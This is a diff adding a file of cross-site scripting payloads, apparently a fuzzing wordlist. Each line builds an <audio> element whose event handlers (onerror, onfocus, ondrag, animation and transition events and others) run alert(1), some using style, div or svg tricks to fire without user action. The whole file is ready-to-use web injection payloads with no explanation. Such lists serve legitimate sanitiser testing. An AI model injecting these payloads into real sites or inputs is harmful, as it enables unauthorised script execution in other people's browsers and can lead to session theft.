@@ -1,0 +1,55 @@
+<audio src onloadstart=alert(1)>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio draggable="true" ondrag="alert(1)">test</audio>
+<audio draggable="true" ondragend="alert(1)">test</audio>
+<audio draggable="true" ondragenter="alert(1)">test</audio>
+<audio draggable="true" ondragleave="alert(1)">test</audio>
+<audio draggable="true" ondragstart="alert(1)">test</audio>
+<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x tabindex=1 onactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
+<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
+<audio onbeforecopy="alert(1)" contenteditable>test</audio>
+<audio onbeforecut="alert(1)" contenteditable>test</audio>
+<audio onbeforepaste="alert(1)" contenteditable>test</audio>
+<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onclick="alert(1)">test</audio>
+<audio oncontextmenu="alert(1)">test</audio>
+<audio oncopy="alert(1)" contenteditable>test</audio>
+<audio oncut="alert(1)" contenteditable>test</audio>
+<audio ondblclick="alert(1)">test</audio>
+<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio onkeydown="alert(1)" contenteditable>test</audio>
+<audio onkeypress="alert(1)" contenteditable>test</audio>
+<audio onkeyup="alert(1)" contenteditable>test</audio>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onmousedown="alert(1)">test</audio>
+<audio onmouseenter="alert(1)">test</audio>
+<audio onmouseleave="alert(1)">test</audio>
+<audio onmousemove="alert(1)">test</audio>
+<audio onmouseout="alert(1)">test</audio>
+<audio onmouseover="alert(1)">test</audio>
+<audio onmouseup="alert(1)">test</audio>
+<audio onpaste="alert(1)" contenteditable>test</audio>
+<audio src/onerror=alert(1)>
+<div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>
+<div draggable="true" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>
+<style>:target {color: red;}</style><audio id=x style="transition:color 10s" ontransitioncancel=alert(1)></audio>
+<style>:target {color:red;}</style><audio id=x style="transition:color 1s" ontransitionend=alert(1)></audio>
+<style>:target {transform: rotate(180deg);}</style><audio id=x style="transition:transform 2s" ontransitionrun=alert(1)></audio>
+<style>@keyframes slidein {}</style><audio style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></audio>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style="position:absolute;" onanimationcancel="alert(1)"></audio>
+<style>@keyframes x{}</style><audio style="animation-name:x" onanimationend="alert(1)"></audio>
+<style>@keyframes x{}</style><audio style="animation-name:x" onanimationstart="alert(1)"></audio>
+<svg><audio onload=alert(1)></audio>
